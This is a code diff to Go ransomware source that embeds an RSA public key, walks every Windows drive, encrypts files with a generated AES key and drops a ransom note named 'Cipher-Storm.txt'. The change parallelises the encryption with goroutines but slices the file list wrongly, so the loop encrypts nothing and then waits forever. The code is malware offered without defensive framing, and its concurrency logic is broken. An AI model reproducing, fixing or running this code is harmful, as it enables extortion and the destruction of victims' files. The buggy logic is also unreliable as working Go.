@@ -28,7 +28,7 @@ var EXT = []string{
 }
 var FILES = []string{}
 
-const publicKeyFile = `-----BEGIN PUBLIC KEY-----
+const public_Key = `-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA5ITxibqvxk1GQ0kXAWaR
 VIz45Lc/y5Fgj1HpCZ14HSWBsPgeS6qRxQtooQr7h6BBfwF40sM+xOtadTJ+MNEv
 tCXRBB8OmPNPRf3HV1y9ZnGTnBCgMm/jJ1kzs1no2bEv/9QcmUWuYn/DoMfGjGQO
@@ -44,7 +44,7 @@ St6kW8kUefnfYuFgWq92TOMCAwEAAQ==
 -----END PUBLIC KEY-----`
 
 func rsa_encode(aes_key []byte) error {
-	block, _ := pem.Decode([]byte(publicKeyFile))
+	block, _ := pem.Decode([]byte(public_Key))
 	if block == nil || block.Type != "PUBLIC KEY" {
 	}
 
@@ -116,7 +116,7 @@ func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
 	return enc_byte_text, nil
 }
 
-func encrypt_file(file_name string, key []byte) error {
+func encrypt_file(file_name string, key []byte, done chan bool) error {
 	file, err := os.ReadFile(file_name)
 	if err != nil {
 		return err
@@ -131,6 +131,7 @@ func encrypt_file(file_name string, key []byte) error {
 	if err != nil {
 		return err
 	}
+	done <- true
 	return nil
 }
 
@@ -169,8 +170,13 @@ func ransom(file_name string) error {
 }
 
 func main() {
-	for i := 65; i < 91; i++ {
-		drive := string(rune(i)) + ":\\\\"
+
+	drives := []string{"A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\",
+		"I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\",
+		"S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
+	}
+
+	for _, drive := range drives {
 		_, err := os.Stat(drive)
 		if err == nil {
 			traverse(drive)
@@ -180,8 +186,26 @@ func main() {
 	aes_gen_password := aes_password_generator()
 	rsa_encode(aes_gen_password)
 
-	for _, file := range FILES {
-		encrypt_file(file, aes_gen_password)
+	done := make(chan bool)
+
+	min := func(a, b int) int {
+		if a > b {
+			return b
+		} else {
+			return a
+		}
+	}
+
+	for i := 0; i < len(FILES); i += 20 {
+		go func(i int) {
+			for _, file := range FILES[i:min(i, i+20)] {
+				encrypt_file(file, aes_gen_password, done)
+			}
+		}(i)
+	}
+
+	for range FILES {
+		<-done
 	}
 
 	ransom("Cipher-Storm.txt")
